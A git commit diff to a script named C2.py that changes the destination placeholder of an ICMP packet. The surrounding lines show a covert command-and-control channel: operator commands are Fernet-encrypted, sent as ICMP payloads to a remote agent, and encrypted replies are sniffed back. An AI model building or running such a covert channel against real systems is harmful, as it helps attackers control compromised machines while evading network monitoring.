66ab5fc11bc851d58403357517109fa987aaaaff
@kshay f3d33 <44234355+akshayfedee@users.noreply.github.com>
2022-12-12 21:33:58 +0000

    Update C2.py

--- C2.py
+++ C2.py
@@ -13,7 +13,7 @@ def main():
         encrypted_command = fernet.encrypt(command.encode('utf-8'))
 
         # build the ICMP packet with the encrypted command as the payload
-        pinger = IP(dst="xxx")/ICMP(id=0x0001, seq=0x1)/encrypted_command
+        pinger = IP(dst="localhost-xxx")/ICMP(id=0x0001, seq=0x1)/encrypted_command
         send(pinger)
         # wait for the ICMP message containing the encrypted response from the agent
         rx = sniff(count=1, timeout=2, filter='icmp')
